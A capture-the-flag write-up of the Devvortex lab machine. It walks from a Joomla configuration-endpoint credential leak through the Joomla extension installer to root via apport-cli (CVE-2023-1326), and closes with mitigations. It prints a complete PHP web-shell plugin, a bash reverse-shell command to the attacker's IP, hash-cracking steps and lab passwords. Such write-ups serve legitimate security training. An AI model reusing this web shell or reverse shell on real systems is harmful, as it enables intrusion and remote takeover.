# Devvortex - Ashbo3n

## 1. Box Info

<table border="1" id="bkmrk-name-platform-and-di" style="border-collapse: collapse; width: 100%;"><colgroup><col style="width: 50%;"></col><col style="width: 50%;"></col></colgroup><tbody><tr><td>**Name**

</td><td><span class="htb-text-primary htb-font-medium avatar-icon-name-details__name htb-heading-lg htb-font-bold" title="Devvortex">Devvortex</span></td></tr><tr><td>**Platform And Difficulty**

</td><td>Easy / 4.2</td></tr><tr><td>**Area Of Interest / Vulnerabilities Covered**

</td><td>Information Disclosure, RCE, Plain text Password, Weak Hashes, Sudo misconfiguration</td></tr></tbody></table>

## 2. Reconnaissance &amp; Enumeration

### 2.1. Scoping the Network

We start our journey with a thorough port scan to identify the attack surface. In this phase, we look for "doors" (ports) that are open on the target.

**Nmap Scan:**

```
nmap $IP -sVC -p- -vv --min-rate=5000 -oN nmap_initial
```

**Command Breakdown:**

- `-sV`: Service version detection (tells us what software is running).
- `-sC`: Runs default nmap scripts (checks for common vulnerabilities).
- `-p-`: Scans all 65,535 ports.
- `--min-rate=5000`: Speeds up the scan (be careful on real engagements as this is noisy).
- `-oN`: Saves the output to a normal text file for later reference.

**Output**

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 2.2. Web Discovery

Upon identifying a web server on port \[Port\], I performed technology profiling and directory discovery. Web servers are often the most common entry point.

**WhatWeb Analysis:** WhatWeb identifies technologies used by a website (e.g., servers, embedded scripts, and CMS versions).

```bash
http://devvortex.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@DevVortex.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.229.146], JQuery[3.4.1], Script[text/javascript], Title[DevVortex], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

**Directory &amp; VHost Fuzzing:** I utilized `ffuf` (Fuzz Faster U Fool) to discover hidden folders or subdomains that aren't linked on the main page.

```bash
ffuf -c -u http://devvortex.htb/ -w ~/wordlist/bitquark-subdomains-top100000.txt -H 'Host: FUZZ.devvortex.htb' -t 60 -ic -fs 154
```

**Key Findings:**

- `/dev`: dev is a VHOST you can add it to your /etc/hosts, we will perform more recon on this one.

**Directory Fuzzing**

```bash
ffuf -c -u http://dev.devvortex.htb/FUZZ -w ~/wordlist/directory-list-2.3-medium.txt -t 60 -ic -fs 162
```

**Key findings**

`administrator/` - administrator/ is a directory, upon visiting i found out that it was a login page, further google searches and some research revealed that [http://dev.devvortex.htb/administrator/manifests/files/joomla.xml](http://dev.devvortex.htb/administrator/manifests/files/joomla.xml) end point revels joomla version which is `4.2.6` more research took me to this article [https://www.vulncheck.com/blog/joomla-for-rce](https://www.vulncheck.com/blog/joomla-for-rce) which revealed that going to [http://10.9.49.205/api/index.php/v1/config/application?public=true](http://10.9.49.205/api/index.php/v1/config/application?public=true) will return the creds for DB which were:

**User** - `lewis`

**Password** - `P4ntherg0t1n5r3c0n##`

We can log in to Dashboard

## 3. Vulnerability Analysis

After getting access of dashboard i started to roam over the site, using it and seeing its function when i came across a feature where we can install plugins, the url is - [http://dev.devvortex.htb/administrator/index.php?option=com\_installer&amp;view=install](http://dev.devvortex.htb/administrator/index.php?option=com_installer&view=install) then i terminal created a webshell.xml file with this content:

```xml
<?xml version="1.0" encoding="utf-8"?>
<extension type="plugin" group="system" method="upgrade">
    <name>Heaven</name>
    <author>Lewis</author>
    <version>1.1.0</version>
    <description>Internal debugging tools</description>
    <files>
        <filename plugin="webshell">webshell.php</filename>
    </files>
</extension>
```

And a webshell.php file:

```php
<?php
defined('_JEXEC') or die;

class plgSystemWebshell extends JPlugin
{
    public function onAfterInitialise()
    {
        // Triggered via ?cmd=[command]
        if (isset($_GET['cmd'])) {
            echo "";
            // Execute the command and capture output
            system($_GET['cmd'] . ' 2>&1');
            echo "";
            exit; // Stop Joomla from loading the rest of the page
        }
    }
}
```

Now put these files into a folder with only these 2 files in the folder and create a zip, you can create a zip with the command zip -r heaven \[folder name\] which should then create a zip file, you can now upload this zip file to the given URL and once it returns a installed successful message we can go to [http://dev.devvortex.htb/index.php?cmd=whoami](http://dev.devvortex.htb/index.php?cmd=whoami) and it should return www-data we successfully got the webshell.

## 4. Exploitation (Getting a Foothold)

Converting Web Shell to Reverse Shell

Now that we have web shell we can intercept the request of the webshell in burp, after intercepting we can convert web shell to reverse shell by first starting a listener on port 4444 and now in burp remove whoami from cmd parameter and put this command (<span style="background-color: rgb(241, 196, 15);">Don't forget to change the IP Box to your actual IP</span>)

```
echo+'bash+-i+>%26+/dev/tcp/[YourIP]/4444+0>%261'+|+base64+|+base64+-d+|+bash
```

now on your listener you should get a shell.

```bash
www-data@devvortex:~/dev.devvortex.htb$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@devvortex:~/dev.devvortex.htb$ pwd
/var/www/dev.devvortex.htb
www-data@devvortex:~/dev.devvortex.htb$
```

## 4.2. Internal Enumeration

Once inside, Now we can access the database and hashes, we can access the database with the command - `mysql -u lewis -p -h 127.0.0.1` onces prompted for password enter the password we found earlier, which is P4ntherg0t1n5r3c0n## now we can access the DB and its tables, enter these commands one by one:

1. USE joomla;
2. SELECT \* FROM sd4fg\_users;

Now we can get the hash for the user logan, take the hash and put it into a .txt file and run this command:

```
hashcat -m 3200 hash.txt ~/wordlist/rockyou.txt
```

Hash successfully cracked:

```bash
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho
```

Now we can either ssh as logan or in the rev shell we can use the command su, I personally did ssh.

You can find the user flag in logan's home dir.

```bash
logan@devvortex:~$ ls
user.txt
logan@devvortex:~$ pwd
/home/logan
logan@devvortex:~$ id
uid=1000(logan) gid=1000(logan) groups=1000(logan)
logan@devvortex:~$
```

## 5. Privilege Escalation (Scaling to Root)

### 5.1. The Escalation Path

Using sudo -l revels we may run /usr/bin/apport-cli as root, upon some google searches reveals that version below versions 2.26.0 and earlier are vulnerable to CVE-2023-1326, Follow these steps to become root:

1. `sudo /usr/bin/apport-cli bash` - This tells Apport you want to report a bug, which causes it to collect system data into a report.
2. **Wait** for the prompt that looks like this:

`What would you like to do? Your options are:` `S: Send report (1.4 KB)` `V: View report` `K: Keep report file for later uploading or sharing` `I: Ignore` `Q: Quit`

Type **`V`** and press **Enter**.

3\. While the report text is on the screen, type: `!sh` And press **enter**

4\. You should now see a shell prompt (likely a `#`). Verify your identity.

Full process did by me is shown below:

```bash
logan@devvortex:~$ sudo -l
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
logan@devvortex:~$ systemctl status /usr/bin/apport-cli
Unit usr-bin-apport\x2dcli.mount could not be found.
logan@devvortex:~$ sudo systemctl status apport-cli
Sorry, user logan is not allowed to execute '/usr/bin/systemctl status apport-cli' as root on devvortex.
logan@devvortex:~$ sudo /usr/bin/apport-cli bash

*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.
.........................

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (1.7 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V
# whoami
root
# cd /root
# cat root.txt
```

## 6. Conclusion &amp; Mitigations  


The vulnerabilities identified in this box stemmed from improper configuration, exposed sensitive endpoints, and outdated software versions.

- <span data-path-to-node="3,0,1,0">**<span class="citation-254">Restrict Access to Configuration Endpoints:</span>**<span class="citation-254"> The initial foothold was gained due to a publicly accessible Joomla configuration endpoint</span></span><span data-path-to-node="3,0,1,1"><span class="citation-254 citation-end-254"><sup class="superscript" data-turn-source-index="1"></sup><sup class="superscript" data-turn-source-index="1"></sup></span></span><span data-path-to-node="3,0,1,2">. </span><span data-path-to-node="3,0,1,4"><span class="citation-253">Ensure that sensitive API paths and configuration files (like </span>`<span class="citation-253">joomla.xml</span>`<span class="citation-253"> or API config routes) are restricted to internal IP addresses or protected by robust authentication</span></span><span data-path-to-node="3,0,1,5"><span class="citation-253 citation-end-253"><sup class="superscript" data-turn-source-index="2"></sup><sup class="superscript" data-turn-source-index="2"></sup></span></span><span data-path-to-node="3,0,1,6">.</span>
- <span data-path-to-node="3,1,1,0">**<span class="citation-252">Enforce Strong Password Policies:</span>**<span class="citation-252"> The database credentials found in the configuration leak were reused for the database service</span></span><span data-path-to-node="3,1,1,1"><span class="citation-252 citation-end-252"><sup class="superscript" data-turn-source-index="3"></sup><sup class="superscript" data-turn-source-index="3"></sup><sup class="superscript" data-turn-source-index="3"></sup><sup class="superscript" data-turn-source-index="3"></sup></span></span><span data-path-to-node="3,1,1,2">. Implement unique, high-entropy passwords for all service accounts and rotate them regularly to prevent credential stuffing or reuse attacks.</span>
- <span data-path-to-node="3,1,1,2"><span data-path-to-node="3,2,1,0">**<span class="citation-251">Harden CMS Plugin Management:</span>**<span class="citation-251"> The attacker gained Remote Code Execution (RCE) by uploading a malicious zip file containing a web shell through the Joomla installer</span></span><span data-path-to-node="3,2,1,1"><span class="citation-251 citation-end-251"><sup class="superscript" data-turn-source-index="4"></sup><sup class="superscript" data-turn-source-index="4"></sup><sup class="superscript" data-turn-source-index="4"></sup></span></span><span data-path-to-node="3,2,1,2">. Restrict the ability to install plugins to a limited number of highly privileged administrators and implement file-type validation or "allow-listing" for any uploaded content.</span></span>
- <span data-path-to-node="3,1,1,2"><span data-path-to-node="3,2,1,2"><span data-path-to-node="3,3,1,0">**<span class="citation-250">Patch and Update System Utilities:</span>**<span class="citation-250"> The escalation to root was possible due to a known vulnerability (CVE-2023-1326) in </span>`<span class="citation-250">apport-cli</span>`<span class="citation-250"> versions 2.26.0 and earlier</span></span><span data-path-to-node="3,3,1,1"><span class="citation-250 citation-end-250"><sup class="superscript" data-turn-source-index="5"></sup><sup class="superscript" data-turn-source-index="5"></sup></span></span><span data-path-to-node="3,3,1,2">. </span><span data-path-to-node="3,3,1,4"><span class="citation-249">Regularly update system-level utilities and monitor for security advisories related to sudo-capable binaries</span></span><span data-path-to-node="3,3,1,5"><span class="citation-249 citation-end-249"><sup class="superscript" data-turn-source-index="6"></sup><sup class="superscript" data-turn-source-index="6"></sup></span></span><span data-path-to-node="3,3,1,6">.</span></span></span>
- <span data-path-to-node="3,1,1,2"><span data-path-to-node="3,2,1,2"><span data-path-to-node="3,3,1,6"><span data-path-to-node="3,4,1,0">**<span class="citation-248">Apply the Principle of Least Privilege:</span>**<span class="citation-248"> The user </span>`<span class="citation-248">logan</span>`<span class="citation-248"> was granted sudo permissions to run </span>`<span class="citation-248">apport-cli</span>`<span class="citation-248"> as root, which ultimately led to the full system compromise</span></span><span data-path-to-node="3,4,1,1"><span class="citation-248 citation-end-248"><sup class="superscript" data-turn-source-index="7"></sup></span></span><span data-path-to-node="3,4,1,2">. Review all `/etc/sudoers` entries and remove unnecessary elevated permissions for standard users.</span></span></span></span>

### <span data-path-to-node="3,1,1,2"><span data-path-to-node="3,2,1,2"><span data-path-to-node="3,3,1,6"><span data-path-to-node="3,4,1,2">Summary of mitigations</span></span></span></span>

<table border="1" id="bkmrk-vulnerability-catego" style="border-collapse: collapse; width: 100%; height: 211.4px;"><colgroup><col style="width: 33.3333%;"></col><col style="width: 33.3333%;"></col><col style="width: 33.3333%;"></col></colgroup><tbody><tr style="height: 29.6333px;"><td style="height: 29.6333px;"><span data-path-to-node="6,0,0,0">Vulnerability Category</span></td><td style="height: 29.6333px;"><span data-path-to-node="6,0,1,0">Root Cause</span></td><td style="height: 29.6333px;"><span data-path-to-node="6,0,2,0">Recommended Action</span></td></tr><tr style="height: 63.2333px;"><td style="height: 63.2333px;"><span data-path-to-node="6,1,0,0">Information Disclosure</span></td><td style="height: 63.2333px;"><span data-path-to-node="6,1,1,0,1"><span class="citation-247">Publicly accessible API/Config endpoints</span></span><span data-path-to-node="6,1,1,0,2"><span class="citation-247 citation-end-247"><sup class="superscript" data-turn-source-index="8"></sup><sup class="superscript" data-turn-source-index="8"></sup></span></span><span data-path-to-node="6,1,1,0,3">.</span></td><td style="height: 63.2333px;">Implement strict Access Control Lists (ACLs) for `/api/` and `/manifests/` directories.</td></tr><tr style="height: 29.6333px;"><td style="height: 29.6333px;">Remote Code Execution</td><td style="height: 29.6333px;"><span data-path-to-node="6,2,1,0,1"><span class="citation-246">Unrestricted plugin/file upload in Joomla dashboard</span></span><span data-path-to-node="6,2,1,0,2"><span class="citation-246 citation-end-246"><sup class="superscript" data-turn-source-index="9"></sup></span></span><span data-path-to-node="6,2,1,0,3">.</span></td><td style="height: 29.6333px;">Disable web-based installers in production or enforce strict file-integrity checking.</td></tr><tr style="height: 29.6333px;"><td style="height: 29.6333px;">Credential Exposure</td><td style="height: 29.6333px;"><span data-path-to-node="6,3,1,0,1"><span class="citation-245">Plaintext credentials in configuration files</span></span><span data-path-to-node="6,3,1,0,2"><span class="citation-245 citation-end-245"><sup class="superscript" data-turn-source-index="10"></sup><sup class="superscript" data-turn-source-index="10"></sup><sup class="superscript" data-turn-source-index="10"></sup><sup class="superscript" data-turn-source-index="10"></sup></span></span><span data-path-to-node="6,3,1,0,3">.</span></td><td style="height: 29.6333px;">Use environment variables or a dedicated secret management vault instead of plaintext files.</td></tr><tr style="height: 29.6333px;"><td style="height: 29.6333px;">Privilege Escalation</td><td style="height: 29.6333px;"><span data-path-to-node="6,4,0,0">**Escalation**</span><span data-path-to-node="6,4,1,0,1"><span class="citation-244">Vulnerable version of </span>`<span class="citation-244">apport-cli</span>`<span class="citation-244"> with sudo rights</span></span><span data-path-to-node="6,4,1,0,2"><span class="citation-244 citation-end-244"><sup class="superscript" data-turn-source-index="11"></sup><sup class="superscript" data-turn-source-index="11"></sup><sup class="superscript" data-turn-source-index="11"></sup><sup class="superscript" data-turn-source-index="11"></sup></span></span><span data-path-to-node="6,4,1,0,3">.</span>

</td><td style="height: 29.6333px;">Update `apport` to version 2.26.1 or later and audit sudoer permissions.</td></tr><tr style="height: 29.6333px;"><td style="height: 29.6333px;"><span data-path-to-node="6,5,0,0">Insecure Hashing</span></td><td style="height: 29.6333px;"><span data-path-to-node="6,5,1,0,1"><span class="citation-243">Weak/Crackable user password hashes in the database</span></span><span data-path-to-node="6,5,1,0,2"><span class="citation-243 citation-end-243"><sup class="superscript" data-turn-source-index="12"></sup><sup class="superscript" data-turn-source-index="12"></sup><sup class="superscript" data-turn-source-index="12"></sup><sup class="superscript" data-turn-source-index="12"></sup></span></span><span data-path-to-node="6,5,1,0,3">.</span></td><td style="height: 29.6333px;">Use stronger hashing algorithms (e.g., Argon2) and enforce complex user passwords.</td></tr></tbody></table>
